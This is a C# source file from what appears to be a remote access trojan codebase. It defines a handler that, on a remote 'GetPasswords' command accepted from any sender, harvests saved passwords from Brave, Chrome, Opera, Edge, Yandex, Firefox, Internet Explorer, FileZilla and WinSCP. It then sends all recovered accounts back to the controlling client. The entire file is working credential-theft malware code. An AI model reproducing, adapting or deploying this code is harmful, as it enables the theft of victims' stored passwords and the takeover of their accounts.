using Ton618.Recovery.Browsers;
using Ton618.Recovery.FtpClients;
using Q3C273.Shared.Messages;
using Q3C273.Shared.Models;
using Q3C273.Shared.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using Ton618.Recovery;

namespace Ton618.MessageHandlers
{
    public class PasswordRecoveryHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is GetPasswords;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetPasswords msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetPasswords message)
        {
            var recovered = new List<RecoveredAccount>();

            var passReaders = new IAccountReader[]
            {
                new BravePassReader(),
                new ChromePassReader(),
                new OperaPassReader(),
                new OperaGXPassReader(),
                new EdgePassReader(),
                new YandexPassReader(),
                new FirefoxPassReader(),
                new InternetExplorerPassReader(),
                new FileZillaPassReader(),
                new WinScpPassReader()
            };

            foreach (var passReader in passReaders)
            {
                try
                {
                    recovered.AddRange(passReader.ReadAccounts());
                }
                catch (Exception e)
                {
                    Debug.WriteLine(e);
                }
            }

            client.Send(new GetPasswordsResponse { RecoveredAccounts = recovered });
        }
    }
}
